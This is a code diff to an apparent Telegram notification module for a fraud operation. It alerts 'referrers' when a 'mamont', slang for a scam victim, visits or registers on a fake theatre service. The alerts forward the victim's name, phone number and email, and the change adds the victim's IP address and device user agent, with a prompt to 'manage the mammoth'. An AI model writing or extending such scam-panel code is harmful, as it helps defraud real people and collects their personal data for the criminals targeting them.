@@ -60,15 +60,19 @@ async def notification_purchase(ref_owner_id: int, qty: int, total_price: int):
         logger.info(f"Sending purchase notification to chat_id={chat_id}")
         await send_telegram_message(chat_id, msg)
 
-async def notify_mamont_visit(referrer_user_id: int, mamont_id: str, service: str = "Театр"):
+async def notify_mamont_visit(referrer_user_id: int, mamont_id: str, service: str = "Театр", ip: str = "Неизвестно", user_agent: str = "Неизвестно"):
     """Notify referrer about new mamont visit."""
     row = await db.fetchone("SELECT chat_id FROM users WHERE id = ?", (referrer_user_id,))
     if row and row['chat_id']:
-        msg = f"🦣 <b>Новый мамонт в сервисе {service}!</b> <code>{mamont_id}</code>"
+        msg = (
+            f"🦣 <b>Новый мамонт в сервисе {service}!</b> <code>{mamont_id}</code>\n\n"
+            f"<code>IP: {ip}\n"
+            f"Устройство: {user_agent}</code>"
+        )
         logger.info(f"Notify mamont visit: referrer_user_id={referrer_user_id}, mamont_id={mamont_id}, service={service}")
         await send_telegram_message(row['chat_id'], msg)
 
-async def notify_mamont_registration(referrer_user_id: int, mamont_display: str, first_name: str, last_name: str, phone: str, email: str, service: str = "Театр"):
+async def notify_mamont_registration(referrer_user_id: int, mamont_display: str, first_name: str, last_name: str, phone: str, email: str, service: str = "Театр", ip: str = "Неизвестно", user_agent: str = "Неизвестно"):
     """Notify referrer about mamont registration."""
     logger.info(f"Starting mamont registration notification: referrer_user_id={referrer_user_id}, mamont={mamont_display}, service={service}")
     
@@ -81,7 +85,9 @@ async def notify_mamont_registration(referrer_user_id: int, mamont_display: str,
             f"<code>Имя: {first_name}\n"
             f"Фамилия: {last_name}\n"
             f"Номер: {phone}\n"
-            f"Почта: {email}</code>\n\n"
+            f"Почта: {email}\n\n"
+            f"IP: {ip}\n"
+            f"Устройство: {user_agent}</code>\n\n"
             f"<i>Для управления мамонтом перейдите в список мамонтов.</i>"
         )
         logger.info(f"Sending mamont registration notification to chat_id={chat_id}: referrer_user_id={referrer_user_id}, mamont={mamont_display}, service={service}")
